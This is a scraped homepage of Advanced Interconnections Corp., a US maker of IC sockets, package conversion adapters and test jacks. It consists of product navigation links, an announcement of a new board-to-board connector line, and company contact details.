  + [Package Conversion Adapters](https://www.advanced.com/products/package-conversion-adapters)
    - [SOIC to DIP Adapters](https://www.advanced.com/products/package-conversion-adapters/soic-to-dip-adapters)
    - [PLCC to PGA Adapters](https://www.advanced.com/products/package-conversion-adapters/plcc-to-pga-adapters)
    - [LGA/BGA SMT Adapters](https://www.advanced.com/products/package-conversion-adapters/lga-bga-smt-adapters)
    - [QFP Adapters](https://www.advanced.com/products/package-conversion-adapters/qfp-adapters)
    - [Customized Adapter Solutions](https://www.advanced.com/products/package-conversion-adapters/customized-adapter-solutions)
  + [Peel-A-Way® Removable Carriers](https://www.advanced.com/products/peel-a-way-removable-carriers)
    - [Peel-A-Way® Strips](https://www.advanced.com/products/peel-a-way-removable-carriers/peel-a-way-strips)
    - [IC Sockets (DIP/PGA)](https://www.advanced.com/products/peel-a-way-removable-carriers/ic-sockets-dip-pga)
    - [SocketPac® Socket Carriers](https://www.advanced.com/products/peel-a-way-removable-carriers/relay-sockets-socketpac)
  + [Terminals & Test Jacks](https://www.advanced.com/products/terminals-test-jacks)
    - [Screw-Machined Terminals](https://www.advanced.com/products/terminals-test-jacks/screw-machined-terminals)
    - [Test Point Pins](https://www.advanced.com/products/terminals-test-jacks/test-point-pins)
    - [EMC® Terminals & Test Jacks](https://www.advanced.com/products/terminals-test-jacks/emc-terminals-test-jacks)
  + [Customized Connectors](https://www.advanced.com/products/customized-connectors)
* Resources & Tools
  + [Documentation](https://www.advanced.com/resources-tools/documentation)
  + [BGA Footprint Finder](https://www.advanced.com/footprints)
  + [CAD Drawing (PDF) Search](https://www.advanced.com/cadsearch)
  + [Part Number Search](https://www.advanced.com/resources-tools/part-number-search)
  + [Build-A-Part Number](https://www.advanced.com/bap)
* How to Order
  + [Submit an RFQ](https://www.advanced.com/rfq)
  + [Sample Order](https://www.advanced.com/how-to-order/sample-order)
  + [Distributors and Reps](https://www.advanced.com/sales)
* Contact
  + [Sales & Tech Support](https://www.advanced.com/contact/tech-support)
  + [Contact Us Form](https://www.advanced.com/inforequest)
  + [Directions](https://www.advanced.com/contact/directions)
  + [Site Map](https://www.advanced.com/contact/site-map)
* Search

* + ![aic ic poster hero](/uploads/media_items/aic-ic-poster-hero.931.250.s.jpg)
* + ![aic adapters poster hero](/uploads/media_items/aic-adapters-poster-hero.931.250.s.jpg)
* + ![aic bga poster hero](/uploads/media_items/aic-bga-poster-hero.931.250.s.jpg)
* + ![aic customized poster hero](/uploads/media_items/aic-customized-poster-hero.931.250.s.jpg)
* + ![homepagecarousel](/uploads/media_items/homepagecarousel-1.928.250.s.jpg)
* + ![aic connectors poster hero](/uploads/media_items/aic-connectors-poster-hero.931.250.s.jpg)
* + ![aic Peel-A-Way poster hero](/uploads/media_items/aic-peel-a-way-poster-hero.931.250.s.jpg)

Special Announcement

Check out our NEW Board to Board Product Line

[Learn more here.](https://www.advanced.com/about/news/2024/11/12/introducing-advanced-interconnections-new-board-to-board-connector-product-line-available-in-0-50mm-0-65m-0-75mm-0-8mm-1-0mm)

Check out our latest video...

Advanced Interconnections Corp., West Warwick, RI, USA

Phone: 1 401 823 5200

Email: info@advanced.com

![Made in USA](/images/foot-flag.png)
Made in the USA

![Worldwide Sales](/images/foot-globe.png)
Designed-in Globally

![Contact us by phone](/images/foot-phone.png)
401-823-5200

[Sign up for news & updates](https://www.advanced.com/about/news?feed=rss)

**Quick Links**

Providing Customized Interconnect Solutions for Over 35 Years.

© 2012-2024 Advanced Interconnections Corp., West Warwick, RI USA
For details relating to proprietary information protected by patents, go to [www.advanced.com/patents](https://www.advanced.com/patents)


